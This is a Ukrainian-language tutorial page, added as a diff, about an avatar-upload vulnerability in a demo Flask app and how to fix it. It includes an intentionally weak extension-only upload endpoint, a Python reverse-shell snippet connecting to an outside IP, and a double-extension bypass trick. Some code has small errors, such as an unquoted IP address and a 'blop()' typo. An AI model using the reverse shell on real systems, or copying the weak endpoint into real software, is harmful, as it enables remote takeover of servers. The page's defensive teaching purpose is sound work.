@@ -1,0 +1,196 @@
+
+                <!DOCTYPE html>
+                <html lang="uk">
+                    <head>
+                        <meta charset="UTF-8">
+                        <title>Document</title>
+                        <link rel="stylesheet" href=..\..\style.css>
+                    </head>
+                    <body>
+                        <h1 class="topic-name">Завантаження аватарки</h2>
+                        <div class="main">
+                            <ul>
+<li><a href="../../index.html">HOME</a></li>
+<li><strong>Вразливості веб застосунку</strong>
+<ul>
+<li><strong>API Endpoints</strong>
+<ul>
+<li><a href="../API Endpoints/API.html">API</a></li>
+</ul>
+</li>
+<li><strong>CSRF</strong>
+<ul>
+<li><a href="../CSRF/CSRF.html">CSRF</a></li>
+</ul>
+</li>
+<li><strong>File Upload</strong>
+<ul>
+<li><a href="Завантаження аватарки.html">Завантаження аватарки</a></li>
+</ul>
+</li>
+<li><strong>Login форма</strong>
+<ul>
+<li><a href="../Login форма/User enumeration.html">User enumeration</a></li>
+<li><a href="../Login форма/Словниковий перебір та брут-форсинг паролів.html">Словниковий перебір та брут-форсинг паролів</a></li>
+</ul>
+</li>
+<li><strong>Overexposed JSON</strong>
+<ul>
+<li><a href="../Overexposed JSON/Надмірне розкриття даних.html">Надмірне розкриття даних</a></li>
+</ul>
+</li>
+<li><strong>XSS</strong>
+<ul>
+<li><a href="../XSS/Stored XSS.html">Stored XSS</a></li>
+</ul>
+</li>
+<li><strong>Конфігурація</strong>
+<ul>
+<li><a href="../Конфігурація/Fail2Ban.html">Fail2Ban</a></li>
+<li><a href="../Конфігурація/Firewall.html">Firewall</a></li>
+<li><a href="../Конфігурація/HTTPS.html">HTTPS</a></li>
+<li><a href="../Конфігурація/Internal Network.html">Internal Network</a></li>
+<li><a href="../Конфігурація/PostgreSQL.html">PostgreSQL</a></li>
+<li><a href="../Конфігурація/SSH.html">SSH</a></li>
+</ul>
+</li>
+<li><a href="../Налаштування користувача.html">Налаштування користувача</a></li>
+<li><a href="../Структура та ідеї.html">Структура та ідеї</a></li>
+</ul>
+</li>
+</ul>
+
+                            <div class="content">
+                            <hr />
+<p>Навіть така проста дія яка зміна аватара користувача може містити в собі вразливість, яка може призвести до віддаленого доступу до серверу зловмисником. На сервері повинна відбуватися багато шарова перевірка файлу на його валідність. В моєму прикладі є така вразливість.</p>
+<hr />
+<pre><code class="language-python">def allowed_file(filename):
+    return '.' in filename and \
+           filename.rsplit('.', 1)[1].lower() in ALLOWED_EXTENSIONS
+           
+@app.route('/api/avatar', methods=['POST'])
+@login_required
+def upload_avatar():
+    if 'avatar' not in request.files:
+        return jsonify({&quot;error&quot;: &quot;No file&quot;}), 400
+    file = request.files['avatar']
+    if file.filename == '':
+        return jsonify({&quot;error&quot;: &quot;Empty filename&quot;}), 400
+    if not allowed_file(file.filename):
+        return jsonify({&quot;error&quot;: &quot;Invalid file type&quot;}), 400
+    filename = secure_filename(f&quot;{current_user.id}.{file.filename.rsplit('.', 1)[1]}&quot;)
+    PATH = path.join(app.config['UPLOAD_FOLDER'], filename)
+    file.save(PATH)
+    current_user.avatar = filename
+    db.session.commit()
+    return jsonify({
+        &quot;avatar_url&quot;: f&quot;/static/avatars/{filename}&quot;
+    }), 200
+</code></pre>
+<p>Наведений вище API endpoint - це функція для заміни аватарки користувача. Станом на зараз всі заходи безпеки, які вона виконує це перевірка розширення файлу та фільтрація назви самого файлу. В цьому випадку допустимими можуть бути лише PNG, JPG, JPEG, WEBP формати. </p>
+<hr />
+<p>Припустимо, зловмисник створив файл, який буде робити підключення до встановленої IP адреси та надаватиме цьому підключенню доступ до оболонки (reverse shell):</p>
+<pre><code class="language-python">import sys,socket,os,pty
+s=socket.socket()
+s.connect((192.168.100.20,4444))
+[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
+pty.spawn(&quot;/bin/sh&quot;)
+</code></pre>
+<p>Але якщо спробувати завантажити цей файл як аватарку, то зрозуміло що вона не пройде. З теперішньою перевіркою причиною цьому слугує розширення файлу. Щоб обійти цей захист достатньо замаскувати це розширення: змінити назву з <code>shell.py</code> на <code>shell.py.png</code>. Завдяки такій маніпуляції файл був завантажений, і він досі виконуваний.</p>
+<p>Також це може бути скрипт який краде дані, створює web shell, завантажує додатковий payload, встановлює віруси типу криптомайнера, створює бекдор для подальшого регулярного доступу і т.д. </p>
+<div class="callout callout-warning">Щоб такого не було треба:</div>
+<blockquote>
+<ul>
+<li>Перевіряти "магічні" байти</li>
+<li>Перевіряти через Pillow</li>
+<li>ресейвінг зображення</li>
+<li>Не виконувати файл через зовнішні CLI команди</li>
+<li>Обмеження розміру файлу</li>
+<li>Не зберігати в тій же директорії де запущений сервер</li>
+</ul>
+</blockquote>
+<hr />
+<h2>Заходи безпеки</h2>
+<div class="callout callout-note">Для обмеження розмірів завантажених файлів в конфігу сервера варто додати наступний рядок:</div>
+<blockquote>
+<p><code>python
+app.config["MAX_CONTENT_LENGTH"] = 5 * 1024 * 1024</code></p>
+</blockquote>
+<p>Для оновленої функції перевірки файлу треба бібліотека <code>pillow</code></p>
+<pre><code class="language-python">from PIL import Image
+
+...
+
+def allowed_file(file):
+    if '.' not in file.filename:
+        return False
+    extension = file.filename.rsplit('.', 1)[1].lower()
+    if extension not in ALLOWED_EXTENSIONS:
+        return False
+    file_bytes = file.read(4096)
+    mime = magic.from_buffer(file_bytes, mime=True)
+    if mime not in [&quot;image/jpeg&quot;, &quot;image/png&quot;, &quot;image/gif&quot;, &quot;image/webp&quot;]:
+        return False
+    file.seek(0)
+    try:
+        img = Image.open(file)
+        img.load()
+        if img.width &gt; 4000 or img.height &gt; 4000:
+            return False
+    except Exception:
+        return False
+    file.seek(0)
+    return True
+</code></pre>
+<div class="callout callout-note">Функція вище перевіряє:</div>
+<blockquote>
+<ul>
+<li>Розширення</li>
+<li>Тип файлу на байтовому рівні (MIME)</li>
+<li>Переконується, що це зображення в спробі відкрити його</li>
+<li>Перевіряє розмір зображення</li>
+</ul>
+</blockquote>
+<p>В самій функції API відбувається конвертація для того, аби очистити метадані зображення на випадок якщо зловмисник помістить payload туди:</p>
+<pre><code class="language-python">filename = secure_filename(f&quot;{current_user.id}.{file.filename.rsplit('.', 1)[1]}&quot;)
+PATH = path.join(app.config['UPLOAD_FOLDER'], filename)
+img = Image.open(file)
+img = img.convert(&quot;RGB&quot;)
+img.save(PATH)
+</code></pre>
+<hr />
+<p>Також є необхідність перемістити папку з завантаженими зображеннями з кореневої директорії серверу:</p>
+<pre><code class="language-bash">sudo mkdir -p /var/lib/demo-web/uploads/avatars
+sudo chown server:server /var/lib/demo-web
+sudo chmod 750 /var/lib/demo-web
+</code></pre>
+<div class="callout callout-warning">Важливо!</div>
+<blockquote>
+<p>Тут передана влада над директорією користувачу <code>server</code>. Цей користувач має великий спектр можливостей і також від його імені запускається застосунок Flask. Для безпеки завжди варто створювати нового користувача для роботи з веб сервером з дуже обмеженими правами, це буде розглядатися і коригуватися далі.</p>
+</blockquote>
+<p>Як гарна практика було перероблено спосіб відправки файлу аватарки з серверу. Тобто раніше під час завантаження сторінки де має бути аватарка сервер робив запит на отримання шляху до неї а потім клієнт знову робив запит, тільки вже за шляхом цього файлу. Тепер це буде відбуватися наступним чином:</p>
+<pre><code class="language-python">@app.route('/api/me')
+@login_required
+def me():
+    file_path = path.join(app.config['AVATARS_FOLDER'], current_user.avatar)
+    if file_path:
+        return send_file(file_path), 200
+    else:
+        return send_file(&quot;/static/assets/no-avatar.png&quot;, mimetype=&quot;image/png&quot;), 200
+</code></pre>
+<p>Тепер <strong>me</strong> endpoint повертає аватарку до відповідного користувача. Саме аватарку, а не шлях до неї. А клієнтська частина буде приймати цей файл завдяки <code>blob()</code>:</p>
+<pre><code class="language-js">...
+.then(res =&gt; res.blob())
+    .then(data =&gt; {
+        document.getElementById('userAvatar').src=URL.createObjectURL(data);
+    })
+</code></pre>
+<p>Але з таким підходом варто зробити деяке коригування в налаштуваннях CSP. За раніше встановленою конфігурацією переданий файл буде блокуватися, тому варто встановити дозвіл на використання <code>blop()</code>:</p>
+<pre><code class="language-bash">Content-Security-Policy:
+    img-src 'self' blob: data:;
+</code></pre>
+                            </div>
+                        </div>
+                    </body>
+                </html>
+                
